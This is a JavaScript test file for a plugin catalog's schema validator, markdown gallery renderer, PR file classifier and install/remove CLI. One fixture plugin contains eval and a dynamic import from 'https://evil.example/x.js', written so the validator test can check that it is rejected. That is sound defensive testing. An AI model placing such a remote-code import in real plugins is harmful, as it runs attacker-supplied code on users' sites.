import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { inspectPlugin, validateManifest } from './schema.mjs';
import { buildRegistry, renderCatalogMarkdown } from './registry.mjs';
import { classifyPrFiles } from './validate.mjs';
import { addPlugin, listInstalled, removePlugin, runCli } from './cli.mjs';

const REPO_ROOT = fileURLToPath(new URL('../', import.meta.url));

function makeMockSite(root, { engineVersion = '0.3.0', hasHost = true } = {}) {
  mkdirSync(join(root, 'engine'), { recursive: true });
  mkdirSync(join(root, 'world'), { recursive: true });
  writeFileSync(join(root, 'index.html'), '<title>Test</title>\n');
  writeFileSync(join(root, 'home.config.js'), 'export default { plugins: [] };\n');
  writeFileSync(join(root, 'engine/manifest.json'), JSON.stringify({ version: engineVersion, files: {} }));
  if (hasHost) writeFileSync(join(root, 'engine/plugins.js'), 'export const PLUGIN_API = 1;\n');
  return root;
}

test('schema validates manifests and blocks remote script execution and eval', () => {
  const work = mkdtempSync(join(tmpdir(), 'hc-plugins-schema-'));
  try {
    assert(validateManifest({ id: 'Bad_ID' }).length > 0);
    const pluginDir = join(work, 'evil');
    mkdirSync(pluginDir, { recursive: true });
    writeFileSync(join(pluginDir, 'plugin.json'), JSON.stringify({
      id: 'evil',
      version: '0.1.0',
      minEngine: '0.3.0',
      name: { en: 'Evil', zh: '测试' },
      description: { en: 'Test', zh: '测试' },
      author: 'test',
      license: 'MIT',
    }));
    writeFileSync(join(pluginDir, 'README.md'), '# Evil\n');
    writeFileSync(join(pluginDir, 'LICENSE'), 'MIT\n');
    writeFileSync(join(pluginDir, 'index.js'), 'export default { setup() { eval("1+1"); import("https://evil.example/x.js"); } };\n');
    const res = inspectPlugin(pluginDir, 'evil');
    assert.equal(res.valid, false);
    assert(res.errors.some(e => e.includes('AGENTS.md')));
    assert(res.errors.some(e => e.includes('preview')));
    assert(res.errors.some(e => e.includes('eval')));
    assert(res.errors.some(e => e.includes('remote executable scripts')));
  } finally {
    rmSync(work, { recursive: true, force: true });
  }
});

test('renderCatalogMarkdown builds gallery tables with title (author) and preview image', () => {
  assert.equal(renderCatalogMarkdown({ format: 1, plugins: [] }, 'zh'), '_暂无收录的插件。_');
  assert.equal(renderCatalogMarkdown({ format: 1, plugins: [] }, 'en'), '_No plugins listed yet._');

  const reg = buildRegistry(REPO_ROOT);
  const zhSingle = renderCatalogMarkdown(reg, 'zh');
  assert.equal(zhSingle, [
    '| [欢迎横幅（示例）](plugins/welcome/) (terryHu7) |',
    '| :---: |',
    '| <a href="plugins/welcome/"><img src="plugins/welcome/preview-zh.webp" width="240" alt="欢迎横幅（示例）"></a> |',
  ].join('\n'));
  const enSingle = renderCatalogMarkdown(reg, 'en');
  assert.equal(enSingle, [
    '| [Welcome (Example)](plugins/welcome/) (terryHu7) |',
    '| :---: |',
    '| <a href="plugins/welcome/"><img src="plugins/welcome/preview-en.webp" width="240" alt="Welcome (Example)"></a> |',
  ].join('\n'));

  const four = {
    format: 1,
    plugins: ['a', 'b', 'c', 'd'].map((id, idx) => ({
      id,
      name: { en: `Plugin ${id.toUpperCase()}`, zh: `插件 ${id.toUpperCase()}` },
      author: `dev${idx + 1}`,
      path: `plugins/${id}`,
      preview: `plugins/${id}/preview.webp`,
    })),
  };
  assert.equal(renderCatalogMarkdown(four, 'en'), [
    '| [Plugin A](plugins/a/) (dev1) | [Plugin B](plugins/b/) (dev2) | [Plugin C](plugins/c/) (dev3) |',
    '| :---: | :---: | :---: |',
    '| <a href="plugins/a/"><img src="plugins/a/preview.webp" width="240" alt="Plugin A"></a> | <a href="plugins/b/"><img src="plugins/b/preview.webp" width="240" alt="Plugin B"></a> | <a href="plugins/c/"><img src="plugins/c/preview.webp" width="240" alt="Plugin C"></a> |',
    '| **[Plugin D](plugins/d/) (dev4)** | | |',
    '| <a href="plugins/d/"><img src="plugins/d/preview.webp" width="240" alt="Plugin D"></a> | | |',
  ].join('\n'));
});

test('PR file classification enforces single-plugin boundary', () => {
  const single = classifyPrFiles([
    'plugins/welcome/index.js', 'plugins/welcome/plugin.json', 'registry.json', 'README.md', 'README.en.md',
  ]);
  assert.equal(single.isPluginPr, true);
  assert.deepEqual(single.pluginIds, ['welcome']);
  assert.deepEqual(single.unexpected, []);

  const multi = classifyPrFiles(['plugins/a/index.js', 'plugins/b/index.js']);
  assert.deepEqual(multi.pluginIds, ['a', 'b']);

  const escape = classifyPrFiles(['plugins/a/index.js', 'tools/cli.mjs']);
  assert.deepEqual(escape.unexpected, ['tools/cli.mjs']);
});

test('CLI lists, searches, installs frontend + optional backend, updates, and removes cleanly', () => {
  const work = mkdtempSync(join(tmpdir(), 'hc-plugins-cli-'));
  try {
    // Catalog commands on real repo
    const reg = buildRegistry(REPO_ROOT);
    assert(reg.plugins.some(p => p.id === 'welcome'));
    assert.equal(runCli(['search', 'welcome'], REPO_ROOT).plugins.length, 1);
    const infoRes = runCli(['info', 'welcome'], REPO_ROOT);
    assert.equal(infoRes.plugin.id, 'welcome');
    assert.equal(infoRes.plugin.agentGuide, 'plugins/welcome/AGENTS.md');
    assert(infoRes.agentGuide.includes('home.config.js'));

    // Site without plugin host fails with actionable upgrade message
    const oldSite = makeMockSite(join(work, 'old-site'), { engineVersion: '0.1.0', hasHost: false });
    assert.throws(() => addPlugin({ id: 'welcome', site: oldSite, catalogRoot: REPO_ROOT }), /npm run update/);

    // Site with plugin host installs cleanly
    const site = makeMockSite(join(work, 'site'), { engineVersion: '0.3.0', hasHost: true });
    const added = addPlugin({ id: 'welcome', site, catalogRoot: REPO_ROOT });
    assert.equal(added.action, 'added');
    assert.equal(added.agentGuide, 'world/plugins/welcome/AGENTS.md');
    assert(existsSync(join(site, 'world/plugins/welcome/index.js')));
    assert(existsSync(join(site, 'world/plugins/welcome/AGENTS.md')));
    assert(existsSync(join(site, 'world/plugins/welcome/.source.json')));
    assert.equal(listInstalled(site).length, 1);

    // Duplicate add without --force refuses; with --force succeeds
    assert.throws(() => addPlugin({ id: 'welcome', site, catalogRoot: REPO_ROOT }), /--force/);
    assert.equal(addPlugin({ id: 'welcome', site, force: true, catalogRoot: REPO_ROOT }).action, 'added');

    // Plugin with optional server directory splits frontend to world/plugins/<id> and server to backend/<id>
    const catalog = join(work, 'catalog');
    const mpDir = join(catalog, 'plugins/mock-mp');
    mkdirSync(join(mpDir, 'server'), { recursive: true });
    writeFileSync(join(mpDir, 'plugin.json'), JSON.stringify({
      id: 'mock-mp',
      version: '1.0.0',
      minEngine: '0.3.0',
      name: { en: 'Mock MP', zh: '模拟联机' },
      description: { en: 'Multiplayer', zh: '联机' },
      author: 'tester',
      license: 'MIT',
      preview: 'preview.webp',
      server: 'server',
    }));
    writeFileSync(join(mpDir, 'README.md'), '# Mock MP\n');
    writeFileSync(join(mpDir, 'AGENTS.md'), '# Mock MP Agent Guide\n');
    writeFileSync(join(mpDir, 'LICENSE'), 'MIT\n');
    writeFileSync(join(mpDir, 'preview.webp'), 'mock-webp\n');
    writeFileSync(join(mpDir, 'index.js'), 'export default { setup() {} };\n');
    writeFileSync(join(mpDir, 'server/server.mjs'), 'console.log("ok");\n');

    const mpAdd = addPlugin({ id: 'mock-mp', site, catalogRoot: catalog });
    assert.equal(mpAdd.backendPath, 'backend/mock-mp');
    assert(existsSync(join(site, 'world/plugins/mock-mp/index.js')));
    assert(!existsSync(join(site, 'world/plugins/mock-mp/server')), 'server directory must not land in world/plugins/');
    assert(existsSync(join(site, 'backend/mock-mp/server.mjs')));

    // Default remove preserves backend/; --with-backend deletes both
    const removed1 = removePlugin({ id: 'mock-mp', site });
    assert.equal(removed1.removedFrontend, true);
    assert.equal(removed1.removedBackend, false);
    assert(existsSync(join(site, 'backend/mock-mp/server.mjs')));

    const removed2 = removePlugin({ id: 'mock-mp', site, withBackend: true });
    assert.equal(removed2.removedBackend, true);
    assert(!existsSync(join(site, 'backend/mock-mp')));

    // Remove welcome
    assert.equal(removePlugin({ id: 'welcome', site }).removedFrontend, true);
    assert.equal(listInstalled(site).length, 0);
  } finally {
    rmSync(work, { recursive: true, force: true });
  }
});
